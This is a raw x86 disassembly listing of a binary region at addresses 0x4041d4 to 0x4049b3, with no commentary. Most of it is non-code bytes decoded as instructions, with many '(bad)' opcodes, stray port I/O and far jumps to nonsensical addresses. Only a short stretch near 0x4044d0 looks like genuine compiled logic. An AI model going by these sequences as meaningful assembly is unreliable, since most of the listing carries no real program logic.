  4041d4:	cmp    eax,0xe052e226
  4041d9:	addr16 call 0x5863178b
  4041df:	loop   0x40419b
  4041e1:	push   ds
  4041e2:	outs   dx,BYTE PTR ds:[esi]
  4041e3:	or     eax,0x855dd6a8
  4041e8:	stos   DWORD PTR es:[edi],eax
  4041e9:	and    esi,DWORD PTR [esp+ecx*2]
  4041ec:	jle    0x404216
  4041ee:	loop   0x4041d2
  4041f0:	xchg   esi,eax
  4041f1:	push   edi
  4041f2:	addr16 push ebp
  4041f4:	mov    al,ds:0x3da39d74
  4041f9:	vandnps xmm3,xmm5,XMMWORD PTR [edi+edx*4]
  4041fe:	cmp    al,BYTE PTR [esi-0x1b]
  404201:	dec    ecx
  404202:	dec    ebx
  404203:	xor    ch,0x7a
  404206:	adc    bl,BYTE PTR [ebx+0x43]
  404209:	xchg   edi,eax
  40420a:	mov    ebp,0xb6a8cf0a
  40420f:	jno    0x40426e
  404211:	sbb    BYTE PTR [eax],cl
  404213:	adc    esi,eax
  404215:	rcl    BYTE PTR [ebx],1
  404217:	out    dx,al
  404218:	sbb    eax,0x908e2d68
  40421d:	das    
  40421e:	imul   eax,DWORD PTR [edi],0xffffffd5
  404221:	ins    DWORD PTR es:[edi],dx
  404222:	pop    edx
  404223:	nop
  404224:	shr    BYTE PTR [ebp-0x44],0xfc
  404228:	cwde   
  404229:	cmp    al,0x8a
  40422b:	sub    DWORD PTR [ebp-0x15],ebx
  40422e:	callw  0xc701
  404232:	adc    eax,0x32bc24f1
  404237:	aas    
  404238:	adc    bh,ah
  40423a:	inc    ebp
  40423b:	pop    esi
  40423c:	inc    edx
  40423d:	mul    DWORD PTR [edx-0x56775095]
  404243:	clc    
  404244:	nop
  404245:	pop    esi
  404246:	mov    eax,ds:0x993776cb
  40424b:	push   es
  40424c:	xchg   edx,eax
  40424d:	lods   eax,DWORD PTR ds:[esi]
  40424e:	test   al,0x12
  404250:	mov    eax,edi
  404252:	pop    ebx
  404253:	ret    0xd897
  404256:	dec    edx
  404257:	fld    TBYTE PTR [ecx]
  404259:	and    eax,0xdb287518
  40425e:	pop    esp
  40425f:	cs inc edi
  404261:	mov    dh,0x72
  404263:	fdiv   DWORD PTR [eax+0x2a]
  404266:	cmp    BYTE PTR es:[ebp+0x334f0661],bh
  40426d:	xor    ebx,DWORD PTR [esi-0x35]
  404270:	sbb    cl,BYTE PTR [eax]
  404272:	jbe    0x404220
  404274:	loopne 0x404200
  404276:	mov    eax,ds:0x27b00a6c
  40427b:	fsubr  QWORD PTR [edx]
  40427d:	sbb    BYTE PTR [eax-0x40f44acf],cl
  404283:	ss js  0x404268
  404286:	and    DWORD PTR [eax],eax
  404288:	jo     0x4042c3
  40428a:	xor    al,0x67
  40428c:	adc    BYTE PTR [ecx],dl
  40428e:	addr16 inc esi
  404290:	lods   eax,DWORD PTR ds:[esi]
  404291:	enter  0x2ca7,0xd1
  404295:	jno    0x4042bf
  404297:	pop    ss
  404298:	adc    eax,DWORD PTR [ebp-0x14dd889e]
  40429e:	ins    BYTE PTR es:[edi],dx
  40429f:	outs   dx,DWORD PTR ds:[esi]
  4042a0:	test   al,0x21
  4042a2:	mov    bh,0x5b
  4042a4:	add    eax,0x9eda78c3
  4042a9:	in     eax,dx
  4042aa:	sbb    eax,0x169a8f0f
  4042af:	jle    0x404292
  4042b1:	xchg   ecx,eax
  4042b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042b3:	ins    DWORD PTR es:[edi],dx
  4042b4:	or     edi,DWORD PTR [ecx]
  4042b6:	test   eax,0x3445af7d
  4042bb:	mov    ecx,esp
  4042bd:	(bad)  
  4042c1:	leave  
  4042c2:	jo     0x404258
  4042c4:	aad    0xb
  4042c6:	sub    esi,edx
  4042c8:	pop    esp
  4042c9:	out    0x2,eax
  4042cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042cc:	repz inc edx
  4042ce:	mov    ch,0x70
  4042d0:	dec    esp
  4042d1:	xor    eax,0x16d67b80
  4042d6:	adc    BYTE PTR [esi],bh
  4042d8:	mov    dl,0xd
  4042da:	lahf   
  4042db:	adc    BYTE PTR [eax+eax*8+0x4af589e9],dl
  4042e2:	cmovp  edi,DWORD PTR [esi]
  4042e5:	fucom  st(3)
  4042e7:	cld    
  4042e8:	ficomp DWORD PTR [edx+0x6bf74b46]
  4042ee:	add    dl,BYTE PTR [edi-0x39]
  4042f1:	mov    ds:0xa4f31ad9,al
  4042f6:	jb     0x4042da
  4042f8:	mov    dh,0x71
  4042fa:	ret    0x81df
  4042fd:	rcr    DWORD PTR [ebp+0x400a0798],1
  404303:	ss addr16 sti 
  404306:	jne    0x404352
  404308:	(bad)  
  40430a:	push   edi
  40430b:	mov    edx,0x23920e6d
  404310:	loope  0x4042f5
  404312:	xchg   edx,eax
  404313:	lds    ebp,FWORD PTR [edx+eiz*2+0x4da2145a]
  40431a:	ds into 
  40431c:	in     eax,0xe
  40431e:	jg     0x40432b
  404320:	inc    ebp
  404321:	call   0x622b9891
  404326:	xor    eax,0x56e820b3
  40432b:	shr    DWORD PTR [esi],cl
  40432d:	jne    0x4042d5
  40432f:	mov    al,0x58
  404331:	jecxz  0x40435f
  404333:	xor    esi,DWORD PTR [ebx-0x30]
  404336:	mov    ebp,0x22816eb3
  40433b:	cmp    bh,BYTE PTR [eax]
  40433d:	loop   0x40432b
  40433f:	aas    
  404340:	ins    BYTE PTR es:[edi],dx
  404341:	bound  eax,QWORD PTR [ecx]
  404343:	xchg   ebx,eax
  404344:	push   es
  404345:	adc    dl,BYTE PTR [edx]
  404347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404348:	(bad)  
  404349:	les    ebx,FWORD PTR [eax]
  40434b:	iret   
  40434c:	or     al,bl
  40434e:	mov    ebp,0xced5b110
  404353:	dec    edx
  404354:	xor    eax,0x28ea8516
  404359:	popf   
  40435a:	shr    BYTE PTR [esp+ecx*1-0x7],1
  40435e:	mov    ebp,0xb73bfb6
  404363:	mov    al,ds:0x94d09666
  404368:	aam    0x11
  40436a:	jmp    0x4043b3
  40436c:	retf   0x63c4
  40436f:	push   ebx
  404370:	pop    ebx
  404371:	test   eax,0xaeb46ff4
  404376:	jg     0x4043ea
  404378:	sbb    al,0xae
  40437a:	xor    eax,0x2986a7a
  40437f:	(bad)  
  404380:	out    dx,eax
  404381:	jmp    0xd3282937
  404386:	outs   dx,DWORD PTR ds:[esi]
  404387:	push   esi
  404388:	dec    ecx
  404389:	push   esp
  40438a:	sub    dl,ch
  40438c:	mov    dl,0x6b
  40438e:	sbb    BYTE PTR [edx],dh
  404390:	mov    eax,ds:0xa97333c2
  404395:	test   eax,0x54ebbecb
  40439a:	jns    0x4043ef
  40439c:	jl     0x4043aa
  40439e:	shl    BYTE PTR [edi-0x67],1
  4043a1:	cmp    ah,BYTE PTR [esi+edx*4-0x16df34d4]
  4043a8:	psubsw mm3,QWORD PTR [esi+0x7a]
  4043ac:	mov    eax,0xd215079d
  4043b1:	popa   
  4043b2:	push   eax
  4043b3:	je     0x40433c
  4043b5:	and    al,0x78
  4043b7:	inc    ebp
  4043b8:	push   esp
  4043b9:	sub    eax,0x2e1a605
  4043be:	adc    eax,0x83e603d3
  4043c3:	stos   DWORD PTR es:[edi],eax
  4043c4:	js     0x40434b
  4043c6:	pop    edi
  4043c7:	ds cmp eax,0xf109021c
  4043cd:	(bad)  
  4043cf:	and    al,0x9f
  4043d1:	push   es
  4043d2:	xor    ecx,esp
  4043d4:	pop    esp
  4043d5:	ret    0xf8d5
  4043d8:	add    DWORD PTR [edx+edx*1-0x6256ae54],edi
  4043df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043e0:	iret   
  4043e1:	imul   eax,esi,0x1066d360
  4043e7:	cmp    ch,BYTE PTR ds:[si+0x64]
  4043ec:	lods   eax,DWORD PTR ds:[esi]
  4043ed:	push   ebx
  4043ee:	dec    edx
  4043ef:	jle    0x404404
  4043f1:	into   
  4043f2:	clc    
  4043f3:	mov    ecx,0xed04fe9a
  4043f8:	xor    BYTE PTR [ecx-0x19a073b9],ch
  4043fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043ff:	cs sahf 
  404401:	test   al,0xfd
  404403:	aad    0x99
  404405:	imul   edx,eax,0xbc53cf25
  40440b:	imul   edi,ecx,0xc
  40440e:	xchg   ecx,eax
  40440f:	inc    ecx
  404410:	adc    BYTE PTR [eax],dh
  404412:	stc    
  404413:	adc    ebx,ecx
  404415:	ins    BYTE PTR es:[edi],dx
  404416:	out    0xb1,eax
  404418:	neg    BYTE PTR [edx]
  40441a:	cdq    
  40441b:	je     0x4043f0
  40441d:	pop    esi
  40441e:	lahf   
  40441f:	xchg   ebp,eax
  404420:	and    cl,dl
  404422:	out    dx,al
  404423:	hlt    
  404424:	call   0x6d36de92
  404429:	outs   dx,DWORD PTR ds:[esi]
  40442a:	fild   WORD PTR ds:0x92df89d5
  404430:	loope  0x4043dd
  404432:	dec    ecx
  404433:	push   0x18
  404435:	in     al,dx
  404436:	fild   QWORD PTR [ebx+0x78]
  404439:	xchg   edi,eax
  40443a:	outs   dx,DWORD PTR ds:[esi]
  40443b:	ret    0x7b90
  40443e:	gs dec edx
  404440:	(bad)  
  404441:	pop    ss
  404442:	mov    WORD PTR [ecx],ss
  404444:	or     ebx,esp
  404446:	sbb    edi,DWORD PTR [edx]
  404448:	cs mov ebx,0xe84b292a
  40444e:	jb     0x4044ad
  404450:	retf   0x8ab4
  404453:	push   esp
  404454:	push   ds
  404455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404456:	out    0xc,al
  404458:	and    eax,0x1e3fab96
  40445d:	add    DWORD PTR [ecx],esi
  40445f:	gs jg  0x4044c9
  404462:	mov    gs,WORD PTR [edi]
  404464:	lods   eax,DWORD PTR ds:[esi]
  404465:	imul   esi,DWORD PTR [esi],0x92d08893
  40446b:	int3   
  40446c:	xor    BYTE PTR [edx+ebx*8+0x19a07244],dh
  404473:	lods   eax,DWORD PTR ds:[esi]
  404474:	xchg   ecx,eax
  404475:	mov    dh,0x17
  404477:	jmp    0x8b9:0xec09ba8b
  40447e:	mov    ds:0xb94f7622,al
  404483:	jp     0x40448e
  404485:	mov    dh,0x12
  404487:	push   esp
  404488:	jle    0x40441d
  40448a:	cmp    BYTE PTR [esi-0x1352b5b8],bl
  404490:	inc    ecx
  404491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404492:	or     eax,0x45531175
  404497:	ja     0x40444f
  404499:	sbb    ebp,DWORD PTR [ebp-0x12]
  40449c:	popa   
  40449d:	jl     0x40444c
  40449f:	pop    esp
  4044a0:	loopne 0x404478
  4044a2:	aas    
  4044a3:	sar    DWORD PTR ds:0x27351e97,cl
  4044a9:	les    ecx,FWORD PTR [ecx+0x6e42ec20]
  4044af:	and    eax,0xd924b8b3
  4044b4:	std    
  4044b5:	cmp    eax,0x6b3680ef
  4044ba:	imul   ebp,ecx,0xbce8f5ce
  4044c0:	cwde   
  4044c1:	loop   0x404464
  4044c3:	mov    esi,0xd73c29c4
  4044c8:	mul    BYTE PTR [esi+0x32]
  4044cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044cc:	(bad)  
  4044cd:	in     eax,dx
  4044ce:	add    al,0x74
  4044d0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044d4:	mov    dl,BYTE PTR [ebp-0x1]
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	add    BYTE PTR [ebp+0x26],0xc7
  40450f:	jmp    0x404538
  404511:	jle    0x404591
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x4044bb
  404518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404519:	push   esp
  40451a:	mov    ch,0x3e
  40451c:	psubb  mm5,QWORD PTR [edi+0x15bc43bf]
  404523:	jne    0x4044c3
  404525:	lahf   
  404526:	bound  ecx,QWORD PTR [ebp+0x4f]
  404529:	and    eax,0x855e2a11
  40452e:	jbe    0x40457f
  404530:	fcom   st(3)
  404532:	and    DWORD PTR [ecx],edi
  404534:	in     al,dx
  404535:	xchg   edi,esp
  404537:	and    BYTE PTR [eax+0x19],dh
  40453a:	(bad)  
  40453b:	test   edx,0x226c9c14
  404541:	cld    
  404542:	mov    ah,0x40
  404544:	test   dh,al
  404546:	push   edx
  404547:	inc    ah
  404549:	out    dx,al
  40454a:	ret    
  40454b:	sbb    ecx,DWORD PTR [ebx]
  40454d:	imul   edi,DWORD PTR [eax-0x7b],0xffffffdd
  404551:	shl    BYTE PTR [esi+eax*8-0x28],1
  404555:	(bad)  
  404556:	pop    eax
  404557:	inc    eax
  404558:	jp     0x404562
  40455a:	call   0xd93db401
  40455f:	and    eax,0x3dab8b31
  404564:	int3   
  404565:	or     ch,BYTE PTR [esi+eax*1+0x22c5ab32]
  40456c:	ss mov esi,0x22cd99b5
  404572:	inc    eax
  404573:	ds (bad) 
  404575:	fwait
  404576:	loop   0x404541
  404578:	pop    ecx
  404579:	push   edi
  40457a:	lods   al,BYTE PTR ds:[esi]
  40457b:	mov    ah,0x41
  40457d:	in     al,dx
  40457e:	sbb    al,BYTE PTR [edx+0x19]
  404581:	dec    esi
  404582:	or     esi,DWORD PTR ds:0x66dbb637
  404588:	xchg   esi,ebp
  40458a:	iret   
  40458b:	xchg   edx,eax
  40458c:	(bad)  
  40458d:	std    
  40458e:	pop    edi
  40458f:	pop    esi
  404590:	mov    bh,0x85
  404592:	jp     0x4045b3
  404594:	jp     0x404592
  404596:	pop    eax
  404597:	jae    0x40451e
  404599:	inc    DWORD PTR [edx+0x25fc8f37]
  40459f:	mov    esi,0x6574848e
  4045a4:	ds test eax,0x2e8b146a
  4045aa:	(bad)  
  4045ab:	fisttp QWORD PTR [ebx]
  4045ad:	cmp    al,0xda
  4045af:	stc    
  4045b0:	and    BYTE PTR [esp+edi*4-0x6b0fc365],dl
  4045b7:	and    eax,0x1745de63
  4045bc:	stos   DWORD PTR es:[edi],eax
  4045bd:	ja     0x40456e
  4045bf:	mov    ch,0x99
  4045c1:	jge    0x40454c
  4045c3:	inc    ecx
  4045c4:	dec    esi
  4045c5:	imul   edx,DWORD PTR [edi-0x5],0x21e6ab8c
  4045cc:	out    0x40,al
  4045ce:	adc    ebx,DWORD PTR [ecx]
  4045d0:	cwde   
  4045d1:	cwde   
  4045d2:	div    BYTE PTR [ebx-0x4d]
  4045d5:	mov    esp,0x1d8f834e
  4045da:	xor    DWORD PTR [eax-0x21],esp
  4045dd:	fstp   DWORD PTR [edx-0x1f]
  4045e0:	dec    ebx
  4045e1:	xor    al,0x13
  4045e3:	mov    cl,0xbc
  4045e5:	test   eax,0x8bb4e607
  4045ea:	mov    ds:0xc72ee4b3,eax
  4045ef:	in     al,0x14
  4045f1:	push   ebx
  4045f2:	xor    DWORD PTR ds:0x491af22a,esp
  4045f8:	test   BYTE PTR [ebp+0x2d],bh
  4045fb:	ins    BYTE PTR es:[edi],dx
  4045fc:	lods   eax,DWORD PTR ds:[esi]
  4045fd:	add    esp,DWORD PTR [eax]
  4045ff:	adc    BYTE PTR [edi-0x1ddc2826],ah
  404605:	scas   eax,DWORD PTR es:[edi]
  404606:	gs retf 
  404608:	jb     0x4045d2
  40460a:	or     cl,BYTE PTR [ebp+0x31]
  40460d:	int    0xfc
  40460f:	sbb    BYTE PTR [eax-0x16feff2f],bh
  404615:	push   ss
  404616:	xor    BYTE PTR [esi+0x73],ch
  404619:	pop    es
  40461a:	cli    
  40461b:	adc    eax,0x13361b75
  404620:	shl    DWORD PTR ds:0xbe449ca0,0xd5
  404627:	mov    ch,0xf2
  404629:	fcomp  DWORD PTR [esi]
  40462b:	jl     0x404688
  40462d:	xor    eax,0xce6d86ad
  404632:	pop    eax
  404633:	cmp    BYTE PTR fs:[edx],cl
  404636:	repnz mov dh,0x4e
  404639:	pop    esi
  40463a:	mov    al,0x77
  40463c:	mov    al,0xa9
  40463e:	fcom   DWORD PTR [ebp+0x386f2217]
  404644:	fldcw  WORD PTR [edx+0x69]
  404647:	fild   WORD PTR [ebx-0x3f]
  40464a:	(bad)  
  40464b:	(bad)  
  40464c:	repnz rol BYTE PTR [eax+0x439f4803],1
  404653:	or     eax,DWORD PTR [ebx+0x5b31f245]
  404659:	jmp    0x1165d5ee
  40465e:	add    DWORD PTR [ecx+0x52],esi
  404661:	fldenv [ebp-0xb]
  404664:	xchg   edx,eax
  404665:	push   cs
  404666:	fild   DWORD PTR [esi-0x60]
  404669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40466a:	pop    edi
  40466b:	in     eax,dx
  40466c:	gs cdq 
  40466e:	cmc    
  40466f:	pop    ebp
  404670:	pop    eax
  404671:	add    cl,BYTE PTR [edx+0x5c]
  404674:	jno    0x4046f0
  404676:	add    BYTE PTR [ebx-0x4],cl
  404679:	fisttp WORD PTR [edi]
  40467b:	addr16 push es
  40467d:	cld    
  40467e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40467f:	adc    BYTE PTR [edi-0x236c0d7a],al
  404685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404686:	push   es
  404687:	bound  esp,QWORD PTR [esp+esi*1]
  40468a:	xchg   ecx,edi
  40468c:	lods   al,BYTE PTR ds:[esi]
  40468d:	pusha  
  40468e:	pop    ecx
  40468f:	dec    ebx
  404690:	sub    eax,0x5810c130
  404695:	xor    DWORD PTR [eax+0x60],ecx
  404698:	stos   DWORD PTR es:[edi],eax
  404699:	and    ebx,esi
  40469b:	in     eax,0xd3
  40469d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40469e:	cli    
  40469f:	mov    eax,ds:0xb79a9c67
  4046a4:	push   edx
  4046a5:	adc    eax,0x1cb27055
  4046aa:	mov    edx,DWORD PTR [esi+0x56]
  4046ad:	(bad)  
  4046af:	mov    WORD PTR [eax-0xe0338c5],fs
  4046b5:	pop    es
  4046b6:	mov    al,BYTE PTR [ebx]
  4046b8:	push   edx
  4046b9:	sub    BYTE PTR [edi+0x73],bl
  4046bc:	cwde   
  4046bd:	hlt    
  4046be:	xor    eax,0x5c360160
  4046c3:	in     al,dx
  4046c4:	jl     0x40473d
  4046c6:	daa    
  4046c7:	or     DWORD PTR [ebx-0x7f97886f],esi
  4046cd:	cdq    
  4046ce:	push   esp
  4046cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046d0:	pop    edi
  4046d1:	ja     0x4046b5
  4046d3:	jne    0x4046c4
  4046d5:	adc    eax,0x1db3d664
  4046da:	xlat   BYTE PTR ds:[ebx]
  4046db:	jmp    0xc6cadfa8
  4046e0:	pop    ds
  4046e1:	imul   DWORD PTR [ecx-0x43]
  4046e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046e5:	dec    ecx
  4046e6:	in     al,dx
  4046e7:	sub    edx,DWORD PTR [edi]
  4046e9:	mov    ds:0x24075a7,al
  4046ee:	pop    esi
  4046ef:	push   es
  4046f0:	sub    edx,esp
  4046f2:	jge    0x404683
  4046f4:	mov    esi,0xd89ed0e5
  4046f9:	or     esi,DWORD PTR ds:0x1f366387
  4046ff:	not    BYTE PTR [edx+0xb1348e4]
  404705:	mov    bh,BYTE PTR [ecx+0x74c8c92d]
  40470b:	fiadd  WORD PTR ds:0x9b949cea
  404711:	mov    ds:0xdb2f82b3,eax
  404716:	jne    0x4046fd
  404718:	or     eax,0x2c86a2e1
  40471d:	push   esi
  40471e:	inc    ebp
  40471f:	xchg   esp,eax
  404720:	dec    ecx
  404721:	inc    BYTE PTR [ebp-0x21f63462]
  404727:	sti    
  404728:	sbb    dl,BYTE PTR [ebp-0x2b6b69cd]
  40472e:	xchg   esi,eax
  40472f:	(bad)  
  404730:	fistp  QWORD PTR [edx-0x7a0fe503]
  404736:	inc    si
  404738:	stos   DWORD PTR es:[edi],eax
  404739:	jp     0x404788
  40473b:	mov    edx,0xd88c76ba
  404740:	inc    esp
  404741:	into   
  404742:	loope  0x4047b0
  404744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404745:	xor    eax,0x7c008550
  40474a:	clc    
  40474b:	xor    dl,BYTE PTR [ebx-0x40ee7511]
  404751:	repnz inc ebx
  404753:	sbb    al,0x50
  404755:	sbb    eax,DWORD PTR [ebp+0x4bce5221]
  40475b:	mov    ds:0xf123aa7,eax
  404760:	scas   eax,DWORD PTR es:[edi]
  404761:	xchg   DWORD PTR [ecx+ebp*1-0x7373c081],ebx
  404768:	push   esp
  404769:	inc    edx
  40476a:	push   es
  40476b:	xchg   DWORD PTR [esi],edx
  40476d:	retf   
  40476e:	cmp    cl,BYTE PTR [ecx+0x76]
  404771:	hlt    
  404772:	fst    DWORD PTR [esi]
  404774:	sbb    WORD PTR [eax],cx
  404777:	xor    BYTE PTR [edi+esi*8+0x2a4b1469],bh
  40477e:	arpl   WORD PTR [eax],bp
  404780:	shr    DWORD PTR [ecx],1
  404782:	loop   0x40479b
  404784:	mov    ch,0x8c
  404786:	(bad)  
  404788:	push   ss
  404789:	push   ebp
  40478a:	xchg   BYTE PTR [edi+0x31],ch
  40478d:	inc    eax
  40478e:	inc    ecx
  40478f:	mov    esp,0x5b2f0094
  404794:	xchg   ecx,eax
  404795:	aad    0x64
  404797:	pop    ds
  404798:	call   0xae2d:0x6cd38ccb
  40479f:	shr    DWORD PTR [edi+0x3da360c6],1
  4047a5:	push   eax
  4047a6:	dec    ebx
  4047a7:	pop    esi
  4047a8:	mov    dl,0x90
  4047aa:	imul   ebx,DWORD PTR [ebx+edi*2-0x2f58670a],0x69c5455e
  4047b5:	rcr    DWORD PTR es:[ebp-0xd6dc2d9],0xf7
  4047bd:	mov    eax,0xd6383a62
  4047c2:	ins    DWORD PTR es:[edi],dx
  4047c3:	inc    ecx
  4047c4:	add    DWORD PTR [edx],edi
  4047c6:	inc    esp
  4047c7:	shl    bh,cl
  4047c9:	outs   dx,BYTE PTR ds:[esi]
  4047ca:	mov    al,ds:0xd35580de
  4047cf:	dec    esp
  4047d0:	out    dx,al
  4047d1:	xor    BYTE PTR ds:0x31c35e5f,0x48
  4047d8:	mov    ecx,0x5a04f216
  4047dd:	(bad)  
  4047de:	out    0x35,al
  4047e0:	jmp    0xa262849e
  4047e5:	(bad)  
  4047e6:	jbe    0x40476f
  4047e8:	push   0xa40abe7d
  4047ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ee:	stc    
  4047ef:	inc    edi
  4047f0:	fst    st(6)
  4047f2:	lahf   
  4047f3:	mov    ds:0x7640d78c,eax
  4047f8:	retf   
  4047f9:	test   BYTE PTR [edx],cl
  4047fb:	dec    esp
  4047fc:	sbb    al,al
  4047fe:	cmp    eax,0xd5c819c0
  404803:	test   al,0x61
  404805:	push   edi
  404806:	add    esp,DWORD PTR [esi-0x5f282fdb]
  40480c:	cwde   
  40480d:	ins    BYTE PTR es:[edi],dx
  40480e:	mov    eax,ds:0x50d2025b
  404813:	xor    eax,0x10c44ca6
  404818:	(bad)  
  404819:	pop    ebp
  40481a:	jne    0x404817
  40481c:	call   0xdb3a:0xe77f83e5
  404823:	gs test eax,0xf9762ffe
  404829:	pusha  
  40482a:	lea    eax,[ecx+0x2310ebd1]
  404830:	(bad)  
  404831:	ror    DWORD PTR [esp+ecx*2-0x3619a575],cl
  404838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404839:	add    al,0xb1
  40483b:	jmp    0xfec5:0x9ffab79d
  404842:	sub    dh,BYTE PTR [edx]
  404844:	jno    0x40488a
  404846:	inc    edx
  404847:	lock cmp eax,0x55a423d6
  40484d:	pop    ss
  40484e:	fild   QWORD PTR [eax-0x3e]
  404851:	stos   BYTE PTR es:[edi],al
  404852:	loope  0x4048ac
  404854:	scas   eax,DWORD PTR es:[edi]
  404855:	imul   edi,DWORD PTR [eax+0x39],0xf4ac9f30
  40485c:	mov    gs,WORD PTR [eax]
  40485e:	add    bh,BYTE PTR [ebp+0x7b]
  404861:	jmp    0x404848
  404863:	aaa    
  404864:	addr16 push edi
  404866:	cdq    
  404867:	inc    edi
  404868:	mov    cl,0x72
  40486a:	test   BYTE PTR [edx-0x4ee7d8e8],dl
  404870:	loope  0x404884
  404872:	mov    ah,BYTE PTR [edx+eax*8-0x7eac2852]
  404879:	stc    
  40487a:	stc    
  40487b:	test   DWORD PTR [edx-0x25d53e12],ebx
  404881:	cmp    DWORD PTR [eax-0x78],ecx
  404884:	sub    eax,0xe2692a24
  404889:	scas   al,BYTE PTR es:[edi]
  40488a:	das    
  40488b:	push   edx
  40488c:	icebp  
  40488d:	lahf   
  40488e:	outs   dx,BYTE PTR ds:[esi]
  40488f:	or     al,BYTE PTR [esi+0x48]
  404892:	ret    0x5761
  404895:	daa    
  404896:	dec    ebx
  404897:	pop    ebx
  404898:	inc    eax
  404899:	cli    
  40489a:	push   esp
  40489b:	retf   
  40489c:	jecxz  0x4048a4
  40489e:	jecxz  0x4048a6
  4048a0:	fnstsw WORD PTR [esi-0x642565dc]
  4048a6:	call   DWORD PTR [eax-0x2b038638]
  4048ac:	(bad)  
  4048ad:	mov    bh,0x77
  4048af:	jmp    0xd894:0xcc9cffa1
  4048b6:	(bad)  
  4048b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048b8:	js     0x404920
  4048ba:	outs   dx,DWORD PTR ds:[esi]
  4048bb:	(bad)  
  4048bc:	cdq    
  4048bd:	add    BYTE PTR [esi],al
  4048bf:	cli    
  4048c0:	arpl   WORD PTR [esp+ebx*8-0x229c4c8c],cx
  4048c7:	inc    ebx
  4048c8:	jp     0x404903
  4048ca:	mov    al,ds:0x7bdf6b62
  4048cf:	xchg   ecx,eax
  4048d0:	pop    eax
  4048d1:	inc    edx
  4048d2:	mov    al,0x9e
  4048d4:	cwde   
  4048d5:	jo     0x4048b4
  4048d7:	adc    ch,ch
  4048d9:	mov    ecx,cs
  4048db:	pop    ebp
  4048dc:	lods   eax,DWORD PTR ds:[esi]
  4048dd:	mov    al,ds:0x9083d6f6
  4048e2:	push   ss
  4048e3:	(bad)  
  4048e5:	mov    ah,0x77
  4048e7:	sub    dh,dl
  4048e9:	retf   0xc3f3
  4048ec:	adc    ebp,eax
  4048ee:	push   esp
  4048ef:	xor    eax,ecx
  4048f1:	add    eax,esi
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	adc    ah,bl
  40491b:	es xchg bl,al
  40491e:	and    edi,DWORD PTR [esi+0x7e]
  404921:	push   esi
  404922:	jns    0x4049a2
  404924:	jle    0x40494a
  404926:	test   BYTE PTR [eax+eiz*4+0x57],bl
  40492a:	xor    BYTE PTR [ebx+edi*4-0x78],ch
  40492e:	sbb    eax,DWORD PTR [esi+0x35]
  404931:	push   es
  404932:	push   ebx
  404933:	dec    esi
  404934:	inc    ebp
  404935:	js     0x404982
  404937:	punpcklwd mm2,DWORD PTR [eax]
  40493a:	(bad)  
  40493b:	pop    esi
  40493c:	jmp    0xab40:0x18d65163
  404943:	bnd jmp 0x4048e3
  404946:	mov    al,ds:0xdf1c6f88
  40494b:	shl    BYTE PTR [edi-0x21],1
  40494e:	adc    DWORD PTR [ebx-0x9],0xc7d0c72a
  404955:	pop    eax
  404956:	adc    edi,edi
  404958:	mov    eax,ds:0x61c43651
  40495d:	jg     0x404903
  40495f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404960:	and    al,0x9a
  404962:	ror    DWORD PTR [eax-0x56],1
  404965:	iret   
  404966:	mov    ebp,0xa4d01578
  40496b:	mov    ?,WORD PTR [edx-0x9dc3304]
  404971:	or     al,0x7b
  404973:	je     0x404912
  404975:	push   cs
  404976:	and    DWORD PTR [eax+edi*4],ebx
  404979:	xchg   DWORD PTR [ebp*4+0xe738668],ecx
  404980:	pop    ebp
  404981:	std    
  404982:	fwait
  404983:	dec    eax
  404984:	adc    edi,edx
  404986:	iret   
  404987:	rol    DWORD PTR [eax+0x7b],0x9
  40498b:	xchg   esi,eax
  40498c:	jne    0x4049d4
  40498e:	icebp  
  40498f:	repz das 
  404991:	not    BYTE PTR [eax]
  404993:	push   edx
  404994:	aad    0x8a
  404996:	jae    0x404931
  404998:	xchg   esi,eax
  404999:	xlat   BYTE PTR ds:[ebx]
  40499a:	(bad)  
  40499b:	mov    ds:0x846803fa,al
  4049a0:	std    
  4049a1:	or     ebp,ebp
  4049a3:	out    dx,al
  4049a4:	pop    edi
  4049a5:	stos   BYTE PTR es:[edi],al
  4049a6:	add    cl,cl
  4049a8:	jmp    0x4049db
  4049aa:	mov    ch,0xc1
  4049ac:	push   0x952f60c3
  4049b1:	mov    dh,0xfb
  4049b3:	out    0xe5,al
